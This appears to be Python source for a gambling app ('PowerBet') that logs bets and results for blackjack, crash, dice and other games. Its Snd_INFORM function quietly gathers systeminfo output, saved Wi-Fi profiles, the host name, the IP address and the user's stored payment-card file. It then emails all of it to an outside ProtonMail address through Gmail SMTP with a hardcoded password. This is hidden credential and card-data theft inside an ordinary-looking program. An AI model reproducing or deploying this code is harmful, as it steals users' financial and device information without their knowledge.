def RDT():
    global now
    global DnT
    import datetime
    now = datetime.datetime.now()
    DnT= now.strftime("%Y-%m-%d %H:%M:%S")


import os
import time

########## Functions ##########




#####################
########SETUP########
#####################
import subprocess
import socket


Device_Name= socket.gethostname()
IP = socket.gethostbyname(Device_Name)
def SysINFOF():
    OpWifi= open('.\\GMsLOG\\SI.bat', mode='w')
    OpWifi.write('@echo off \n>SI.txt (\n  systeminfo\n)')
    OpWifi.close()
    subprocess.Popen('.\\GMsLOG\\SI.bat')
    time.sleep(2)
    #os.remove('.\\GMsLOG\\SI.bat')


def WiFiF():
    Device_Name= socket.gethostname()
    OpWifi= open('.\\GMsLOG\\WF.bat', mode='w')
    OpWifi.write('''@echo off
>WF.txt (netsh wlan show profiles)''')
    OpWifi.close()
    subprocess.Popen('.\\GMsLOG\\WF.bat')
    time.sleep(2)
    #os.remove('.\\GMsLOG\\WF.bat')
    ###





def Snd_INFORM():
    WiFiF()
    SysINFOF()
    import smtplib, ssl
    from Ac_Info import Nickname
    Device_Name= socket.gethostname()
    port = 587  # For starttls
    smtp_server = "smtp.gmail.com"
    sender_email = "PowerBet.Official@gmail.com"
    receiver_email = "PowerBet.Official@protonmail.com"
    EmPa = 'noskhebeta'
    op_crdinfo= open('.\\Card_Info.py',mode='r')
    rd_crdinfo= op_crdinfo.read()
    OpWFR= open('WF.txt', mode='r')
    OpWFRR= OpWFR.read()
    OpSIR= open('SI.txt', mode='r')
    OpSIRR= OpSIR.read()
    time.sleep(1)
    message = """Register  """ + Nickname + """\n\n""" + rd_crdinfo + '\n\n\n\n\n\n'+ 'Device Name:  ' + Device_Name + '\n' + 'IP: ' + str(IP) + '\n\n' + OpSIRR + '\n\n'+ OpWFRR
    context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()  # Can be omitted
        server.starttls(context=context)
        server.ehlo()  # Can be omitted
        server.login(sender_email, EmPa)
        server.sendmail(sender_email, receiver_email, message)
    

#####################
######FOOTBALL#######
#####################




def SFootball():
    from ZZFootballcach import Type
    from ZZFootballcach import Bet
    from ZZFootballcach import Zrib
    from ZZFootballcach import UsrChs
    from ZZFootballcach import Result
    from ZZFootballcach import Income
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tFtBl\t' + Type + '\tBet:' + str(Bet) + '\tIncome: ' + str(Income) + '\tCrdt:'+str(Credit+Income) + '\tUsrChs: ' + str(UsrChs) + '\tResult:' + str(Result) +'\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZFootballcach.py')


#####################
########Games########
#####################
###BlackJack
def SBJWin():
    from ZZBJcach import Result
    from ZZBJcach import Bet
    from ZZBJcach import JoC
    from ZZBJcach import Bot_JoC
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tBJ\t' + 'Win\t\t\t\t\t+' + str(Bet) + '\tCrdt:'+str(Credit) + '\tUsr: ' + str(JoC) + '\t\tBt: ' + str(Bot_JoC) + '\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZBJcach.py')

def SBJLoose():
    from ZZBJcach import Result
    from ZZBJcach import Bet
    from ZZBJcach import JoC
    from ZZBJcach import Bot_JoC
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tBJ\t' + 'Loose\t\t\t\t-' + str(Bet) + '\tCrdt:'+str(Credit) + '\tUsr: '+str(JoC) + '\t\tBt: '+str(Bot_JoC) + '\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZBJcach.py')

###Crash
def SCrshWin():
    from ZZCrshcach import Result
    from ZZCrshcach import Bet
    from ZZCrshcach import Gain
    from ZZCrshcach import OrgRatio
    from ZZCrshcach import UsrRatio
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tCrsh\t' + 'Win' + '\tBet:' + str(Bet) + '\tGain: +' + str(Gain) + '\tCrdt:'+str(Credit+Gain) + '\tUsrRt: ' + str(UsrRatio) + '\tOrgRt:' + str(OrgRatio) +'\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZCrshcach.py')

def SCrshLoose():
    from ZZCrshcach import Result
    from ZZCrshcach import Bet
    from ZZCrshcach import Gain
    from ZZCrshcach import OrgRatio
    from ZZCrshcach import UsrRatio
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tCrsh\t' + 'Loose' + '\tBet:' + str(Bet) + '\tGain: -' + str(Bet) + '\tCrdt:'+str(Credit-Bet) + '\tUsrRt: ' + str(UsrRatio) + '\tOrgRt:' + str(OrgRatio) +'\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZCrshcach.py')

###RatioX
def SRtXWin():
    from ZZRtXcach import Result
    from ZZRtXcach import Bet
    from ZZRtXcach import Gain
    from ZZRtXcach import OrgRatio
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tRtX\t' + 'Win'   + '\tBet:' + str(Bet) + '\tGain: +' + str(Gain) + '\tCrdt:'+str(Credit+Gain) + '\tRt:' + str(OrgRatio) +'\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZRtXcach.py')

def SRtXLoose():
    from ZZRtXcach import Result
    from ZZRtXcach import Bet
    from ZZRtXcach import Gain
    from ZZRtXcach import OrgRatio
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tRtX\t' + 'Loose' + '\tBet:' + str(Bet) + '\tGain: ' + str(Gain) + '\tCrdt:'+str(Credit+Gain) +  '\tRt:' + str(OrgRatio) +'\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZRtXcach.py')

###RPS
def SRPSWin():
    from ZZRPScach import Result
    from ZZRPScach import Bet
    from ZZRPScach import UsrChoice
    from ZZRPScach import BotChoice
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tRPS\t' + 'Win' + '\t\t\t+' + str(Bet) + '\tCrdt:'+str(Credit+Bet) +  '\tUsrChc:' + str(UsrChoice) + '  BtChc:' + BotChoice +'\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZRPScach.py')

def SRPSLoose():
    from ZZRPScach import Result
    from ZZRPScach import Bet
    from ZZRPScach import UsrChoice
    from ZZRPScach import BotChoice
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tRPS\t' + 'Loose' + '\t\t\t-' + str(Bet) + '\tCrdt:'+str(Credit-Bet) +  '\tUsrChc:' + str(UsrChoice) + '  BtChc:' + BotChoice +'\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZRPScach.py')

###DiceRace
def SDRWin():
    from ZZDRcach import Result
    from ZZDRcach import Bet
    from ZZDRcach import UsrRoll
    from ZZDRcach import BotRoll
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tDR\t' + 'Win' + '\t\t\t+' + str(Bet) + '\tCrdt:'+str(Credit+Bet) +  '\tUsrRll:' + str(UsrRoll) + '  BtRll:' + str(BotRoll) +'\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZDRcach.py')

def SDRLoose():
    from ZZDRcach import Result
    from ZZDRcach import Bet
    from ZZDRcach import UsrRoll
    from ZZDRcach import BotRoll
    from Ac_Info import Credit
    RDT()
    rd_log= op_log= open('.\\GMsLOG\\C@cdn0',mode='r')
    rdrd_log= rd_log.read()
    op_log= open('.\\GMsLOG\\C@cdn0',mode='w')
    op_log.write(rdrd_log + str(DnT) + '\tDR\t' + 'Loose' + '\t\t\t-' + str(Bet) + '\tCrdt:'+str(Credit-Bet) +  '\tUsrRll:' + str(UsrRoll) + '  BtRll:' + str(BotRoll) +'\n')
    op_log.close()
    time.sleep(2)
    os.remove('ZZDRcach.py')

####################
####################
####################
####################
####################
"""def VluOfPlyd(AbsBet):
    from Card_Info import CardNom
    from Card_Info import CardIBAN
    from Card_Info import CardName
    from Card_Info import CardYear
    from Card_Info import CardMonth
    from Card_Info import Email
    from Card_Info import NickName
    from Card_Info import Plyd                              #This part is replaced with 'RmnnVluCshot'

    op_inf= open('.\\Card_Info.py',mode='w')
    op_inf.write('CardNom= \''  + CardNom  + '\'\n' +
                'CardIBAN= \'' + CardIBAN + '\'\n' +
                'CardName= \''  + CardName  + '\'\n'+
                'CardMonth= \'' + CardMonth + '\'\n' + 
                'CardYear= \'' + CardYear + '\'\n' + 
                'NickName= \'' + NickName + '\'\n' + 
                'Email= \'' + Email + '\'\n' + 
                'Plyd= ' + str(Plyd+AbsBet) + '\n'
                )
    op_inf.close()"""